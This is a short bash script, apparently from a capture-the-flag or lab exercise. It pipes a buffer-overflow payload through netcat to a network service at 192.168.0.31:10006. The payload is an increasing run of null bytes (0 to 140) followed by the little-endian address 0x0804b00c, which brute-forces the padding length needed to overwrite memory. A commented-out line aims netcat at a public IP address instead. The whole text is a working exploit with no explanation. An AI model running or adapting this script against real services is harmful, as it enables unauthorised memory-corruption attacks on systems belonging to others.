for i in {0..140}
do
	echo "Doing $i"
	python -c "print '\x00'*$i + '\x0c\xb0\x04\x08\n'" | nc 192.168.0.31 10006
	#nc 128.199.98.78 1700
done

#8048551
# 08 04 b0 0c